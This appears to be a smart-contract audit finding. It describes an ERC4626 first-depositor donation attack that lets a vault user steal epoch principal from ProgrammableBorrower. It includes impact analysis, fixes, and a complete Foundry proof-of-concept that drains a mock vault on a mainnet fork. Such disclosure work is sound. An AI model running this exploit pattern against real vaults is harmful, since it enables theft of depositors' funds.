### Title
Unprotected ERC4626 first-deposit lets vault user steal programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower.onStartEpoch()` deposits all idle underlying into the configured ERC4626 vault without requiring a minimum number of shares or checking that the returned share balance economically represents the deposit. [1](#0-0) [2](#0-1) 

When the configured vault is empty or nearly empty and uses balance-based share pricing, an unprivileged vault user can execute the classic first-depositor/donation attack, cause the programmable borrower to receive zero shares, and redeem the donated balance plus the borrower’s deposit. [3](#0-2) [4](#0-3) 

### Finding Description
During epoch start, `IdleCDOEpochVariant` transfers available principal to the strategy borrower and invokes the programmable-borrower start hook. [5](#0-4) 

`ProgrammableBorrower.onStartEpoch()` calculates `startAssets` as its token balance plus current vault assets, then deposits its entire token balance into the ERC4626 vault. [6](#0-5) 

The internal `_depositToVault()` function trusts `vault.deposit()` and ignores the returned share count unless recording an accounting baseline; there is no `minShares`, no solvency check after deposit, and no protection against donation-inflated vault pricing. [2](#0-1) 

The configured vault is only required to expose the same underlying asset; initialization and `setVault()` do not require minimum supply, liquidity, virtual shares, or a non-manipulable exchange rate. [7](#0-6) [8](#0-7) 

Consequently, in a balance-accounted ERC4626 vault, an attacker can deposit one unit, donate at least the upcoming pool deposit, make the pool’s `assets * supply / totalAssets` calculation round to zero, and redeem the attacker’s single share for substantially all vault assets. [3](#0-2) [4](#0-3) 

### Impact Explanation
For a programmable-borrower deployment using a vulnerable ERC4626 vault, a vault user can steal the principal deposited at epoch start. [1](#0-0) 

If the attacker owns one vault share and donates `D` tokens before the pool deposits `V`, then `D >= V` makes `V * 1 / (D + 1)` round to zero, so the pool receives no vault shares while transferring `V` into the vault. [9](#0-8) [10](#0-9) 

The attacker’s one share can then redeem approximately `D + V + 1`, producing a profit of approximately `V` before fees or rounding. [11](#0-10) 

This breaks the fair-deposit invariant and makes the programmable borrower insolvent: `epochStartVaultAssets` records the deposited principal, while the actual vault share balance is zero and `totalUnderlying()` no longer includes those assets. [12](#0-11) [13](#0-12) 

### Likelihood Explanation
The exploit requires an ERC4626 vault whose exchange rate is based on transferable vault-held assets, is vulnerable to donation manipulation, and has a sufficiently small supply relative to the programmable borrower’s deposit. [2](#0-1) 

An empty or nearly empty newly configured vault satisfies that condition, and the attacker needs only ordinary ERC4626 deposit, token-transfer, and redeem capabilities. [4](#0-3) 

Vaults using internal accounting, substantial existing supply, virtual assets/shares, or deposit-share rounding resistant to donation are not exploitable through this path, so likelihood is deployment- and integration-dependent rather than universal. [8](#0-7) 

### Recommendation
Reject vault deposits that return zero shares and require a caller-configured minimum share amount in `_depositToVault()`. [2](#0-1) 

Before epoch activation, verify that `vault.convertToAssets(vault.balanceOf(address(this)))` increased by approximately the deposited amount within an explicit tolerance. [13](#0-12) 

Only configure ERC4626 vaults that are immune to donation-based first-depositor manipulation, for example vaults with virtual shares/assets, internal accounting, or a minimum initialized supply. [7](#0-6) 

### Proof of Concept
The following Foundry test demonstrates the complete loss on a fork while using a minimal balance-priced ERC4626 target to isolate the missing share check. [14](#0-13) [1](#0-0) 

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract FakeIdleCDO {
  address public token;

  constructor(address _token) {
    token = _token;
  }

  function startEpoch(ProgrammableBorrower pb) external {
    pb.onStartEpoch(0);
  }
}

contract DonationERC4626 is ERC20 {
  IERC20 public immutable assetToken;

  constructor(address asset_) ERC20("Vault Share", "vSHARE") {
    assetToken = IERC20(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 assetsBefore = totalAssets();
    uint256 supply = totalSupply();

    // Vulnerable balance-priced ERC4626 accounting.
    shares =
      supply == 0 || assetsBefore == 0
        ? assets
        : assets * supply / assetsBefore;

    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerFirstDepositTest is Test {
  IERC20 constant USDC =
    IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

  function testFirstDepositorStealsEpochPrincipal() external {
    vm.createSelectFork("mainnet");

    address attacker = makeAddr("attacker");
    address realBorrower = makeAddr("realBorrower");
    address manager = makeAddr("manager");
    address owner = makeAddr("owner");

    DonationERC4626 vault = new DonationERC4626(address(USDC));
    FakeIdleCDO cdo = new FakeIdleCDO(address(USDC));

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    ProgrammableBorrower pb = ProgrammableBorrower(
      address(
        new TransparentUpgradeableProxy(
          address(implementation),
          makeAddr("proxyAdmin"),
          abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(vault),
            address(cdo),
            owner,
            manager,
            realBorrower,
            0
          )
        )
      )
    );

    uint256 victimDeposit = 10_000e6;
    uint256 donation = 10_000e6;

    // Attacker creates a one-share vault position and inflates its price.
    deal(address(USDC), attacker, donation + 1);
    vm.startPrank(attacker);
    USDC.approve(address(vault), 1);
    vault.deposit(1, attacker);
    USDC.transfer(address(vault), donation);
    vm.stopPrank();

    // IdleCDO has already sent epoch principal to ProgrammableBorrower.
    deal(address(USDC), address(pb), victimDeposit);
    cdo.startEpoch(pb);

    // The deposit minted zero shares even though all principal entered the vault.
    assertEq(vault.balanceOf(address(pb)), 0);
    assertEq(pb.totalUnderlying(), 0);

    uint256 attackerBefore = USDC.balanceOf(attacker);
    vm.prank(attacker);
    uint256 redeemed = vault.redeem(1, attacker, attacker);

    assertEq(redeemed, donation + 1 + victimDeposit);
    assertEq(
      USDC.balanceOf(attacker) - attackerBefore,
      donation + 1 + victimDeposit
    );
  }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L206-222)
```text
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L535-549)
```text
  /// @notice Return the total exposure in underlying terms (on-hand plus vault position).
  function totalUnderlying() external view returns (uint256) {
    return underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
  }

  /// @notice Return the current vault share balance held by this contract.
  function vaultSharesBalance() external view returns (uint256) {
    return vault.balanceOf(address(this));
  }

  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** test/foundry/ProgrammableBorrowerAccountingInvariant.t.sol (L52-74)
```text
  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  /// @notice Share-to-asset conversion used by the invariant harness.
  function convertToAssets(uint256 shares) public view returns (uint256) {
    if (revertConvertToAssets) revert("convert-to-assets-revert");
    uint256 supply = totalSupply();
    if (supply == 0) {
      return shares;
    }
    return shares * totalAssets() / supply;
  }

  /// @notice Asset-to-share conversion used by the invariant harness.
  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 managedAssets = totalAssets();
    if (supply == 0 || managedAssets == 0) {
      return assets;
    }
    return assets * supply / managedAssets;
  }
```

**File:** test/foundry/ProgrammableBorrowerAccountingInvariant.t.sol (L104-134)
```text
  /// @notice Deposit underlying and mint proportional shares.
  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = totalAssets();
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  /// @notice Withdraw underlying and burn proportional shares.
  function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
    uint256 maxAssets = this.maxWithdraw(owner);
    require(assets <= maxAssets, "insufficient-liquidity");
    shares = _toSharesRoundUp(assets);
    if (msg.sender != owner) {
      _spendAllowance(owner, msg.sender, shares);
    }
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  /// @notice Redeem shares and return underlying based on current share price.
  function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    uint256 maxAssets = this.maxWithdraw(owner);
    require(assets <= maxAssets, "insufficient-liquidity");
    if (msg.sender != owner) {
      _spendAllowance(owner, msg.sender, shares);
    }
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-303)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L124-184)
```text
  function _setUpProgrammableBorrowerCreditVault(uint256 forkBlock, address vaultAddress) internal {
    vm.createSelectFork("mainnet", forkBlock);

    strategy = new IdleCreditVault();
    stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));
    strategy.initialize(USDC, owner, manager, placeholderBorrower, BORROWER_NAME, initialProvidedApr);

    cdoEpoch = new IdleCDOEpochVariant();
    stdstore.target(address(cdoEpoch)).sig(cdoEpoch.token.selector).checked_write(address(0));
    cdoEpoch.initialize(0, USDC, address(this), owner, rebalancer, address(strategy), 100000);
    idleCDO = IdleCDO(address(cdoEpoch));

    underlying = IERC20Detailed(USDC);
    aaTranche = IdleCDOTranche(idleCDO.AATranche());
    bbTranche = IdleCDOTranche(idleCDO.BBTranche());
    oneScale = 10 ** underlying.decimals();

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdoEpoch));
    vm.prank(owner);
    strategy.setMaxApr(0);

    vm.startPrank(owner);
    cdoEpoch.setIsAYSActive(false);
    cdoEpoch.setFeeParams(TL_MULTISIG, 0, 100000, 0);
    cdoEpoch.setInstantWithdrawParams(3 days, 1.5e18, false);
    cdoEpoch.setEpochParams(36.5 days, 5 days);
    cdoEpoch.setKeyringParams(address(0), 0);
    vm.stopPrank();

    deal(USDC, address(this), 1_000_000 * oneScale, true);
    underlying.approve(address(cdoEpoch), type(uint256).max);

    ProgrammableBorrower programmableBorrowerImplementation = new ProgrammableBorrower();
    programmableBorrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(programmableBorrowerImplementation),
      makeAddr("programmableBorrowerProxyAdmin"),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        vaultAddress,
        address(cdoEpoch),
        address(this),
        manager,
        revolvingBorrower,
        365e18
      )
    )));
    morphoVault = IMMVault(vaultAddress);

    vm.prank(owner);
    strategy.setBorrower(address(programmableBorrower));

    vm.prank(owner);
    cdoEpoch.setIsProgrammableBorrower(true);

    vm.prank(manager);
    strategy.setAprs(0, 0);

    vm.prank(revolvingBorrower);
    underlying.approve(address(programmableBorrower), type(uint256).max);
  }
```
